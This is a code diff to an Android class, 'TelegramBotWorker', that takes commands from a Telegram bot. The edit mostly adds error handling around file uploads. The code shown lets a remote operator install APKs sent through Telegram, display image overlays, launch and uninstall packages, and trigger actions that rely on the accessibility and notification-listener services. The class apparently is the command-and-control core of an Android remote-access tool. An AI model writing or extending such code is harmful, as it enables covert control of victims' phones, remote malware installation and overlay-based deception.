@@ -24,6 +24,7 @@ import java.util.List;
 public class TelegramBotWorker implements Runnable {
     private final Context context;
     private long lastUpdateId = 0;
+
     private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_IMAGE_OVERLAY, FOR_APK_INSTALL }
     private WaitingState currentState = WaitingState.NONE;
 
@@ -173,41 +174,46 @@ public class TelegramBotWorker implements Runnable {
         WaitingState previousState = currentState;
         currentState = WaitingState.NONE;
 
-        String fileId;
-        String fileName;
+        try {
+            String fileId;
+            String fileName;
 
-        if (msg.has("document")) {
-            fileId = msg.getJSONObject("document").getString("file_id");
-            fileName = msg.getJSONObject("document").getString("file_name");
-        } else {
-            JSONArray photoSizes = msg.getJSONArray("photo");
-            fileId = photoSizes.getJSONObject(photoSizes.length() - 1).getString("file_id");
-            fileName = fileId + ".jpg";
-        }
-        
-        switch (previousState) {
-            case FOR_IMAGE_OVERLAY:
-                downloadFile(fileId, fileName, path -> {
-                    Intent intent = new Intent(context, OverlayService.class);
-                    intent.setAction("ACTION_SHOW_IMAGE");
-                    intent.putExtra("imagePath", path);
-                    context.startService(intent);
-                    sendMessage("Displaying image overlay...", context);
-                });
-                break;
-            case FOR_APK_INSTALL:
-                if (fileName.toLowerCase().endsWith(".apk")) {
-                    downloadFile(fileId, fileName, this::installApp);
-                } else {
-                    sendMessage("Error: The uploaded file is not an APK.", context);
-                }
-                break;
-            default:
-                sendMessage("Received a file, but I don't know what to do with it.", context);
-                break;
+            if (msg.has("document")) {
+                fileId = msg.getJSONObject("document").getString("file_id");
+                fileName = msg.getJSONObject("document").getString("file_name");
+            } else if (msg.has("photo")) {
+                JSONArray photoSizes = msg.getJSONArray("photo");
+                fileId = photoSizes.getJSONObject(photoSizes.length() - 1).getString("file_id");
+                fileName = fileId + ".jpg";
+            } else {
+                return;
+            }
+            
+            switch (previousState) {
+                case FOR_IMAGE_OVERLAY:
+                    downloadFile(fileId, fileName, path -> {
+                        Intent intent = new Intent(context, OverlayService.class);
+                        intent.setAction("ACTION_SHOW_IMAGE");
+                        intent.putExtra("imagePath", path);
+                        context.startService(intent);
+                        sendMessage("Displaying image overlay...", context);
+                    });
+                    break;
+                case FOR_APK_INSTALL:
+                    if (fileName.toLowerCase().endsWith(".apk")) {
+                        downloadFile(fileId, fileName, this::installApp);
+                    } else {
+                        sendMessage("Error: The uploaded file is not an APK.", context);
+                    }
+                    break;
+                default:
+                    sendMessage("Received a file, but I don't know what to do with it.", context);
+                    break;
+            }
+        } catch (Exception e) {
+             ErrorLogger.logError(context, "HandleFileUpload_JSONError", e);
         }
     }
-
 
     private void handleCallback(JSONObject cb) {
         try {
@@ -217,7 +223,7 @@ public class TelegramBotWorker implements Runnable {
                 sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context);
                 return;
             }
-            if (!NotificationListener.isServiceEnabled() && data.startsWith("NOTIF_")) {
+             if (!NotificationListener.isServiceEnabled() && data.startsWith("NOTIF_")) {
                 sendMessage("⚠️ Action Failed: Notification Listener service is not enabled.", context);
                 return;
             }
